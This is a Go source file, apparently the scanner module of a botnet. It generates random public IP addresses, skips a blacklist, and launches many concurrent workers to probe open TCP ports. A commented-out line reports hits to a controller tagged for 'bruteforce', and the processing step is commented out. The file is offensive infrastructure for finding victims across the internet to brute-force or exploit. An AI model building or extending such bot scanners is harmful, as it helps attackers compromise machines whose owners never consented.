package scanner

import (
	"bot/lib/utils"
	"fmt"
	"net"
	"runtime"
	"time"

	"github.com/zenthangplus/goccm"
)

// scan|ip|port|exploit
//go network.Rose.Report(fmt.Sprintf("scan|%s|80|bruteforce", Address))

func GetScannerThread(ThreadID int) *ScannerThread {
	return &ScannerThread{
		ThreadID: ThreadID,
		Worker:   15 * runtime.NumCPU(),
	}
}

func (S *ScannerThread) GenIpAddr() string {
	for {
		nrange := utils.GenRange(254, 1)

		if _, key := BlacklistIPs[nrange]; key {
			continue
		}

		addr := fmt.Sprintf("%s.%s.%s.%s", nrange, utils.GenRange(254, 1), utils.GenRange(254, 1), utils.GenRange(254, 1))
		return addr
	}
}

func (S *ScannerThread) Reporter() {
	if utils.DebugEnabled {
		for {
			utils.Debug(fmt.Sprintf("[T.%d] Report | Found: %d", S.ThreadID, S.Found))
			time.Sleep(5 * time.Second)
		}
	}
}

func (S *ScannerThread) IsOpenPort(Address string, Port int) bool {
	Sock, Err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", Address, Port), 500*time.Millisecond)

	if Err != nil {
		return false
	}

	Sock.Close()
	return true
}

func (S *ScannerThread) ProcessAddr(Address string) {
	/*if S.IsOpenPort(Address, Port) {
		fmt.Printf("[%d OPEN] %s\n", Port, Address)
	}*/
}

func (S *ScannerThread) Scan() {
	go S.Reporter()

	c := goccm.New(S.Worker)
	utils.Debug(fmt.Sprintf("[T.%d] Starting scanner using %d worker.", S.ThreadID, S.Worker))

	for {
		Address := S.GenIpAddr()

		c.Wait()
		go func(Ip string) {
			defer c.Done()
			S.ProcessAddr(Ip)
		}(Address)
	}
}
